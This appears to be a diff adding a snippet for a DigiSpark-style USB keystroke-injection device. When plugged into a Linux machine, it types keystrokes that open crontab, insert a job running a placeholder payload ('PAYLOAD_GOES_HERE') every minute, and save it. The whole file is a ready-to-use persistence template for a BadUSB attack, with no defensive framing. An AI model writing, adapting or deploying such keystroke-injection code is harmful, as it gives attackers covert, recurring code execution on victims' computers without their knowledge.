@@ -1,0 +1,14 @@
+// Adds a background task on linux to be executed in the background every 60 seconds  
+  
+  DigiKeyboard.print("export VISUAL=nano; crontab -e");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("* * * * * PAYLOAD_GOES_HERE");
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_Y);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
